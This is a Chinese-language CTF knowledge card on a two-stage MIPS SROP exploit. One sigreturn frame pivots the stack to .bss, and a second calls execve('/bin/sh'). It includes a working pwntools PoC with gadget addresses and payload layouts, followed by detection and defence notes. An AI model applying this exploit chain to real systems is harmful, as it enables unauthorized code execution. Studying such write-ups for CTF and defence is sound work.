---
id: binary-pwn-stack-mips-srop-sigreturn-bss-execve
title: MIPS SROP：sigreturn(v0=4119) 栈迁移到 .bss + execve 两阶段利用
type: scenario
domain: binary
path: binary/pwn/stack
technique: mips-srop-sigreturn-bss-execve
aliases:
- MIPS SROP
- mipsssh
- SYS_sigreturn 4119
- MIPS sigreturn frame
- SROP 栈迁移
- execve mips
tags:
- mips
- mipsssh
- srop
- sigreturn
- stack-pivot
- execve
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:40:17+08:00'
  notes: 已对照原文2465-2638行核对：mips-32-big、无PIE、canary假象、read(0,buf,4096)、gadget 0x414080(lw v0,0x14(sp);syscall;jr ra)、SYS_sigreturn=4119/execve=4011、两阶段frame(sp=buf/pc=main→a0=binsh/v0=4011/pc=syscall)、a[5]=4119与frame.v0(offset0x38)不冲突（pwntools mips布局offset0x14为sc_regmask）均成立；已修正原稿与'寄存器字段重合'的措辞；dedup候选为x86/64位SROP不同架构卡
---

## 一句话结论

在静态链接、无 PIE、NX 开启但无 `system` 的 MIPS32 大端程序里，若 `read` 溢出栈且找不到能控制 `$ra` 的栈迁移 gadget，可以用 MIPS SROP 完成两阶段利用：第一次溢出把 `$v0` 设为 `SYS_sigreturn(4119)` 触发 sigreturn，伪造 frame 把 `$sp` 迁到 .bss、`$pc` 指回 `main`；第二次溢出在 .bss 写入 `/bin/sh`，再伪造 frame 设置 `$a0=/bin/sh`、`$v0=SYS_execve(4011)`、`$pc=syscall`，内核恢复上下文后直接 `execve("/bin/sh",0,0)`。MIPS 的 syscall 号是 `4000+` 基址（execve=4011，sigreturn=4119）。

## 原理

- **SROP 基本机制**：触发 `sigreturn` 系统调用时，内核从用户栈读取一个 sigreturn frame（保存的寄存器上下文）并恢复；攻击者伪造该 frame 即可一次性设置所有寄存器（`$a0`、`$v0`、`$pc`、`$sp` 等）。MIPS 的 `SYS_sigreturn` 为 `4000+119=4119`，`SYS_execve` 为 `4000+11=4011`，`SYS_execveat` 为 `4000+356=4356`。
- **MIPS 的 gadget/frame 重合**：`0x00414080` 的 gadget 是 `lw $v0,0x14($sp); syscall; jr $ra; move $v1,$a3`。执行 `sigreturn` 时内核用当前 `$sp` 作为 frame 起始，而 gadget 又从 `$sp+0x14` 读 `$v0`；因此 `frame+0x14`（第 6 个 32 位字，pwntools 布局中为 `sc_regmask`，不在恢复的通用寄存器区）既要放触发 syscall 的调用号 4119，又不会覆盖 `frame.v0`（offset 0x38）等后续参数。原文的做法是先 `frame.v0 = 4011`，把 frame 打包成字数组后强制 `a[5] = 4119`，保证 gadget 读到 4119 触发 sigreturn，而内核恢复后的 `$v0` 仍是后续要用的值（依据 frame 布局与 gadget 偏移，需按目标二进制核对）。
- **为什么需要两阶段**：程序是静态链接、无 `system`，只能用 `syscall` 做 `execve`；`execve` 需要绝对路径 `/bin/sh\x00` 的地址，而第一次溢出时无法同时把字符串写到已知地址并完成 ROP。第一次 SROP 把栈迁移到 .bss（`frame.sp = buf`）并 `$pc=main`，重新进入 main 的 `read`；第二次溢出把 `/bin/sh\x00` 写在栈缓冲区起始（此时栈已在 .bss），再用 SROP 把 `$a0` 指向该字符串、`$v0=4011`、`$pc=syscall`，执行 `execve`。
- **canary 假象**：checksec 显示 Canary found，但 `main` 中没有实际 canary 检查（反汇编 `read` 后直接恢复 `$ra`/`$fp` 返回），因此可以溢出。
- **栈迁移**：第一次 payload `cyclic(0x20) + p32(buf) + SROP链`：0x20 填充到保存的 `$fp`，用 `buf`（.bss 地址）覆盖 `$fp`，然后 `$ra` 指向 syscall gadget；gadget 从 frame+0x14 读 4119，触发 sigreturn，frame.sp=buf、frame.pc=main，回到 main 时栈已在 .bss。第二次 payload `b"/bin/sh\x00" + cyclic(0x18) + p32(buf) + SROP链`：字符串落在 .bss 缓冲区起始，`$fp=buf`，SROP frame 设 `a0=binsh`、`v0=4011`、`pc=syscall`，恢复后执行 `syscall` 即 `execve`。
- **gadget 选择**：原文用 `0x00414080: lw $v0,0x14($sp); syscall; jr $ra; move $v1,$a3`；也可以选 `0x0041407c`（多一条 `lw $s1,($s2)`）或 `0x00414090`（`lw $v0,0x18($sp)`，此时要调整 frame 偏移），关键是 gadget 读 `$v0` 的偏移与 frame 布局匹配。

## 触发条件

- MIPS32 程序（原文 mips-32-big）存在栈溢出，能读入足够长的数据（4096 字节）；无 PIE，.bss 地址固定（原文 buf=0x496000，binsh=0x495fd8）。
- 程序没有 `system`/`execve` 包装函数，但有 `syscall` 指令 gadget；NX 开启，不能直接执行栈上 shellcode。
- 没有可用的 `move $sp,$fp` 栈迁移 gadget（或迁移后无法控制 `$ra`），因此需要 SROP 设置 `$sp`/`$pc`。
- 能构造 MIPS `SigreturnFrame`（pwntools `SigreturnFrame(arch='mips')`），并按端序打包；能算出 `SYS_sigreturn`/`SYS_execve` 号（4000+）。

## 利用步骤

1. 确认架构/端序（mips-32-big）、NX、无 PIE、canary 是否真实检查；用 IDA 看 `main` 的 `read(0, buf, 4096)` 与恢复 `$ra` 的尾声，确认溢出偏移（0x24）。
2. 找 syscall gadget：`lw $v0,0x14($sp); syscall; jr $ra`（0x414080）或等价；确认 gadget 读取 `$v0` 的栈偏移。
3. 第一次溢出：`cyclic(0x20) + p32(buf) + p32(gadget_syscall) + SigreturnFrame`。frame 设 `sp=buf`、`pc=main`；按 gadget 偏移在 frame 的第 6 个字（offset 0x14）写入 4119，触发 sigreturn 并把栈迁到 .bss、回到 main。
4. 第二次溢出：payload 以 `/bin/sh\x00` 开头，填充到 0x20 后覆盖 `$fp=buf`，再放 `p32(gadget_syscall) + SigreturnFrame`；frame 设 `a0=binsh`、`a1=0`、`a2=0`、`v0=4011`、`pc=syscall`，并在 offset 0x14 写 4119 触发 sigreturn。
5. 内核恢复 frame 后执行 `syscall`（v0=4011）即 `execve("/bin/sh",0,0)`；拿到 shell 后 `cat flag.txt`（原文 `CJ{mipppssssshshshshhs_LINZ_IS_HERE}`）。

## PoC

```python
gadget_syscall = 0x00414080   # lw $v0,0x14($sp); syscall; jr $ra; move $v1,$a3
main = 0x0400790
buf = 0x496000
syscall = 0x0414084

# 第一阶段：SROP -> 栈迁移到 .bss，重新进入 main
rop = ROP(elf)
rop.raw(gadget_syscall)
frame = SigreturnFrame(arch='mips')
frame.sp = buf
frame.pc = main
a = unpack_many(bytes(frame))
a[5] = 4119                   # frame+0x14：gadget 读取的 $v0，触发 sigreturn
rop.raw(a)
payload = cyclic(0x20) + p32(buf) + rop.chain()
sl(payload)

# 第二阶段：SROP -> execve("/bin/sh",0,0)
binsh = 0x495fd8
rop = ROP(elf)
rop.raw(gadget_syscall)
frame = SigreturnFrame(arch='mips')
frame.a0 = binsh
frame.a1 = 0
frame.a2 = 0
frame.v0 = 4000 + 11          # SYS_execve
frame.pc = syscall
a = unpack_many(bytes(frame))
a[5] = 4119
rop.raw(a)
payload = b"/bin/sh\x00" + cyclic(0x18) + p32(buf) + rop.chain()
sl(payload)
```

## 变体与关联

- **gadget 偏移变体**：若用 `lw $v0,0x18($sp)` 的 gadget（0x414090），需把 4119 写到 frame+0x18，并核对 frame 字段重叠；不同 gadget 的重合位置不同。
- **静态链接有 `execve` 包装**：可直接 ret2syscall，不必 SROP；SROP 适用于找不到完整设参 gadget 的场景。
- **x86 SROP 对照**：[[binary-pwn-stack-32bit-srop-read-return-sigreturn]] 用 read 返回值置 `eax=0x77`；本卡是 MIPS 的 `v0=4119` 版本，且利用 frame/gadget 重合。
- **栈迁移对照**：[[binary-pwn-rop-mips-pivot-got-libpivot-ret2win]] 用 `move $sp,$fp` 迁移；本卡用 SROP 设置 `$sp`/`$pc`，适用于控制器被限制的场景。
- **边界**：目标有真实 canary、PIE、只读 .bss、无 `syscall` gadget 或 gadget 读 `$v0` 偏移与 frame 不匹配时链不成立；SROP frame 布局随内核/架构版本变化，需按目标核对。

## 检测与防御

- **检测**：MIPS 程序中出现 `lw $v0,0x14($sp); syscall; jr $ra` gadget；栈上出现 sigreturn frame 特征（`v0=4119`、`pc=syscall`、`sp=.bss`）；`read` 后 `$sp` 指向 .bss、`$pc=main` 再次执行。
- **防御**：启用真实 canary、PIE/ASLR；关闭/限制 `read` 长度；对静态链接程序移除/保护 `syscall` gadget；使用 `seccomp` 限制 `execve`/`sigreturn`（若业务允许）。
- **响应**：监控异常 `sigreturn` 调用、`$sp` 指向 .bss、`execve("/bin/sh")`；保留崩溃现场分析 frame。
